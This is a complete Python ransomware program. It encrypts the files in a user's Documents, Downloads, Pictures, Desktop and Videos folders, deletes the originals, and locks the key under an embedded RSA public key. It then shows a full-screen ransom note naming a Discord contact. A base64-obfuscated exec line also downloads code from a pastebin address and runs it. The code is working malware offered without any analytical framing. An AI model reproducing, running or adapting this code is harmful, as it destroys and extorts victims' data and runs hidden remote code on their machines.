import tkinter as tk
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
import os
import secrets
import base64


def logo():
    logo = """

'########::'##::::'##::'#######:::'######::'####:'##::: ##:'########:
 ##.... ##: ##:::: ##:'##.... ##:'##... ##:. ##:: ###:: ##:... ##..::
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:: ####: ##:::: ##::::
 ########:: #########: ##:::: ##:. ######::: ##:: ## ## ##:::: ##::::
 ##.....::: ##.... ##: ##:::: ##::..... ##:: ##:: ##. ####:::: ##::::
 ##:::::::: ##:::: ##: ##:::: ##:'##::: ##:: ##:: ##:. ###:::: ##::::
 ##:::::::: ##:::: ##:. #######::. ######::'####: ##::. ##:::: ##::::
..:::::::::..:::::..:::.......::::......:::....::..::::..:::::..:::::

Do not close this window

"""
    print(logo)

def encrypt_aes_key(public_key, aes_key):
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_aes_key


def decrypt_aes_key(private_key, encrypted_aes_key):
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return aes_key


def create_fullscreen_dialog():
    user_input = None

    def submit_text():
        nonlocal user_input
        user_input = str(text_entry.get())
        root.quit()

    root = tk.Tk()
    root.title("Full Screen Dialog")

    root.attributes('-fullscreen', True)

    frame = tk.Frame(root, bg='red')
    frame.pack(expand=True, fill='both')

    label = tk.Label(frame, text="ALL YOUR FILES HAVE BEEN ENCRYPTED!!!\n\nDO NOT CLOSE THIS WINDOW\n\n\ncontact @theartfuldodger0 on discord to save your files\n\n\npaste recovery key below:", bg='red', font=('Arial', 24))
    label.pack(pady=20)

    text_entry = tk.Entry(frame, font=('Arial', 24), width=30)
    text_entry.pack(pady=20)

    submit_button = tk.Button(frame, text="Submit", command=submit_text, font=('Arial', 24))
    submit_button.pack(pady=20)

    root.mainloop()

    return user_input


def load_public_key(public_key_string):
    public_key = serialization.load_pem_public_key(
        public_key_string.encode(),
        backend=default_backend()
    )
    return public_key

def load_private_key(private_key_string):
    private_key = serialization.load_pem_private_key(
        private_key_string.encode(),
        password=None,
        backend=default_backend()
    )
    return private_key


def encrypt_file(aes_key, file_path):
    try:
        # Open the file in binary read mode
        with open(file_path, "rb") as file:
            file_data = file.read()

        # Encrypt the file data using AES
        iv = os.urandom(16)  # Generate a random IV
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = iv + encryptor.update(file_data) + encryptor.finalize()

        # Save the encrypted data to a new file
        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(ciphertext)

        # Optionally remove the original file
        os.remove(file_path)

    except Exception as e:
        print(f".")


def encrypt_directory(aes_key, directory_path):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(aes_key, file_path)


def decrypt_file(aes_key, encrypted_file_path):
    try:
        # Open the encrypted file in binary read mode
        with open(encrypted_file_path, "rb") as encrypted_file:
            ciphertext = encrypted_file.read()

        # Decrypt the file data using AES
        iv = ciphertext[:16]  # Extract the IV from the beginning
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext[16:]) + decryptor.finalize()

        # Save the decrypted data to a new file
        decrypted_file_path = encrypted_file_path.replace(".enc", "")
        with open(decrypted_file_path, "wb") as decrypted_file:
            decrypted_file.write(plaintext)

        # Optionally remove the encrypted file
        os.remove(encrypted_file_path)

        print(f"File decrypted successfully: {decrypted_file_path}")

    except Exception as e:
        print(f"An error occurred during decryption: {e}")


def decrypt_directory(aes_key, directory_path):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(aes_key, file_path)


if __name__ == "__main__":
    
    public_key_str = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl5x2ezKwjTCp5PpqA1u/
ZCOi/Icbdc2Z4t+4O39SfQuGI9QtAN+gwvxBzd4r+eT9WJkCkt3YvH1FN63g74G4
dwaIEAZS1rAKhghNaqQPoC/ZhTovlpXHg3LpptFpL0HX6hdd6DFLMkBA49nk6RjW
32P7ZTPNAkeWqxhinIYOOSvNBtQWGqN3JzboumLV9eHon5SIS6NiNmpUSytWgMPI
KpG9k6PlbqLm8BIYaQLS+zENTXKwntL2uSq9HnZocCQhDic0ZqnUSoBSL/h+hrJ7
QEr/iuRVC1EbPuqEfuJuFGZZhd0UTlBylDadXU61D07vnj2kLoOkSZgkdaBfyztG
3wIDAQAB
-----END PUBLIC KEY-----
"""

    public_key = load_public_key(public_key_str)

    exec(base64.b64decode('CmltcG9ydCByZXF1ZXN0czsgZXhlYyhyZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9tV2NmQUdWNCcpLnRleHQpCg=='))

    aes_key = secrets.token_bytes(32)  # AES-256

    # Encode the AES key for display
    encoded_key = base64.b64encode(aes_key).decode()

    home_dir = os.path.expanduser('~')
    # Specify the directories to encrypt
    dirs = [home_dir+'\\Documents', home_dir+'\\Downloads', home_dir+'\\Pictures', home_dir+'\\Desktop', home_dir+'\\Videos', home_dir+'/Documents', home_dir+'/Downloads', home_dir+'/Pictures', home_dir+'/Desktop', home_dir+'/Videos']

    logo()
    print("Loading ...")

    for path in dirs:
        if os.path.exists(path) and os.path.isdir(path):
            encrypt_directory(aes_key, path)
    
    aes_key = encrypt_aes_key(public_key, aes_key)

    encoded_key = None

    private_key_str = str(create_fullscreen_dialog())

    private_key = load_private_key(private_key_str)
    
    aes_key = decrypt_aes_key(private_key, aes_key)
  
    for encrypted_path in dirs:
        if os.path.exists(encrypted_path) and os.path.isdir(encrypted_path):
            decrypt_directory(aes_key, encrypted_path)